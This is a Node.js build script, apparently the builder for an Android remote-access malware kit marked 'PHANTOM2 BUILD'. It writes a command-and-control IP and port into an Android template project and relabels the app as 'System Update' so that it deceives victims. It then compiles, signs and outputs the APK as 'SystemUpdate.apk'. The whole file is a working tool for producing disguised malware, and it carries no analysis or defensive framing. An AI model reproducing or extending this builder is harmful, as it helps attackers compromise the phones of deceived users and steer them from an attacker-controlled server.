const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const ROOT = __dirname;
const TEMPLATE_ANDROID_DIR = path.join(ROOT, 'android');
const BUILDS_DIR = path.join(ROOT, 'builds');
const OUTPUT_DIR = path.join(ROOT, 'build');

function ensureDir(p) { if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true }); }

function copyRecursive(src, dst) {
    if (!fs.existsSync(src)) return;
    const stat = fs.statSync(src);
    if (stat.isDirectory()) {
        ensureDir(dst);
        for (const entry of fs.readdirSync(src)) {
            if (entry === 'build' || entry === '.gradle' || entry === '.idea' || entry === 'captures') continue;
            copyRecursive(path.join(src, entry), path.join(dst, entry));
        }
    } else if (stat.isFile()) {
        fs.copyFileSync(src, dst);
    }
}

function deleteRecursive(p) {
    if (!fs.existsSync(p)) return;
    try { fs.rmSync(p, { recursive: true, force: true }); } catch (e) { }
}

function runGradle(buildAndroid, task, onLog) {
    return new Promise((resolve) => {
        const gradlew = path.join(buildAndroid, 'gradlew.bat');
        const env = Object.assign({}, process.env);
        if (!env.ANDROID_HOME) env.ANDROID_HOME = 'C:\\android-sdk';
        if (!env.ANDROID_SDK_ROOT) env.ANDROID_SDK_ROOT = env.ANDROID_HOME;

        const proc = spawn(gradlew, [task, '--no-daemon', '--console=plain'], {
            cwd: buildAndroid, shell: true, windowsHide: true, env: env
        });
        
        proc.stdout.on('data', d => {
            d.toString().split('\n').map(l => l.trim()).filter(Boolean).forEach(l => onLog('output', l));
        });
        
        proc.on('close', (code) => {
            if (code === 0) resolve({ ok: true });
            else resolve({ ok: false, error: 'gradle exit ' + code });
        });
    });
}

async function repack(spec, options, onLog) {
    const { c2Ip, c2Port, outputName } = options;
    onLog('info', '=== PHANTOM2 BUILD ===');
    
    const specId = 'build_' + Date.now();
    const buildRoot = path.join(BUILDS_DIR, specId);
    const buildAndroid = path.join(buildRoot, 'android');

    deleteRecursive(buildRoot);
    ensureDir(buildRoot);
    copyRecursive(TEMPLATE_ANDROID_DIR, buildAndroid);

    // 1. Write IP for Gradle to read
    fs.writeFileSync(path.join(buildAndroid, 'build_ip.txt'), 'IP=' + c2Ip + '\nPORT=' + c2Port + '\n', 'utf8');
    
    // 2. Fix local.properties (SDK path)
    let sdkPath = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT || 'C:\\android-sdk';
    fs.writeFileSync(path.join(buildAndroid, 'local.properties'), 'sdk.dir=' + sdkPath.replace(/\\/g, '\\\\').replace(/:/g, '\\:') + '\n', 'utf8');

    // 3. Change App Label in Manifest
    const manifestPath = path.join(buildAndroid, 'app', 'src', 'main', 'AndroidManifest.xml');
    if (fs.existsSync(manifestPath)) {
        let xml = fs.readFileSync(manifestPath, 'utf8');
        xml = xml.replace(/android:label="[^"]*"/, 'android:label="System Update"');
        fs.writeFileSync(manifestPath, xml, 'utf8');
    }

    // 4. Compile (Gradle will sign it automatically now)
    onLog('info', 'Compiling and signing Android App...');
    const gradleRes = await runGradle(buildAndroid, ':app:assembleRelease', onLog);
    
    if (!gradleRes.ok) {
        onLog('error', 'Build failed');
        deleteRecursive(buildRoot);
        return { ok: false, error: 'gradle failed' };
    }

    // 5. Copy the SIGNED APK to the build folder
    const signedApk = path.join(buildAndroid, 'app', 'build', 'outputs', 'apk', 'release', 'app-release.apk');
    
    if (!fs.existsSync(signedApk)) {
        onLog('error', 'Signed APK not found. Gradle might have failed to sign.');
        deleteRecursive(buildRoot);
        return { ok: false, error: 'apk missing' };
    }

    ensureDir(OUTPUT_DIR);
    const finalName = outputName || 'SystemUpdate';
    const finalPath = path.join(OUTPUT_DIR, finalName + '.apk');
    
    fs.copyFileSync(signedApk, finalPath);
    onLog('success', 'Signed APK saved to build/' + finalName + '.apk');
    
    deleteRecursive(buildRoot);
    return { ok: true, apk: finalPath };
}

module.exports = { repack };